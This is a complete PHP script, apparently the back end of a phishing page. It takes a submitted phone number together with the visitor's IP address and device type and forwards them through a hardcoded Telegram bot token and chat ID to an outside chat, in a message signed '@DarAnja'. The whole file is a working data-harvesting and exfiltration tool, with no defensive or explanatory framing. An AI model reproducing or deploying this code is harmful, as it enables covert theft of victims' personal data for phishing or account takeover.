<?php

$token = "6736145768:AAH72cQONeCkjwfNypU2_owHCLepRuWCyX0";

$id = -4041024884;

$phone = $_POST["phone"];
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_SERVER['HTTP_USER_AGENT'];
$model = rtrim(explode(' ', $_SERVER['HTTP_USER_AGENT'])[2], ")");
$time = file_get_contents("http://api.codebazan.ir/time-date/?td=date");
if ($model === "NT") {
  $model = "Desktop";
} else if ($model === "CPU") {
  $model = "IOS";
}
$Text = "
╔  • NewPHONE •  
║  status : PHONE
╠ • phone : <code>$phone</code>
╠ • ip : <code>$ip</code>
╠ • device : $model 
╚  • @DarAnja •
";

@file_get_contents("https://api.telegram.org/bot$token/sendMessage?parse_mode=HTML&chat_id=$id&text=" . urlencode($Text));

?>


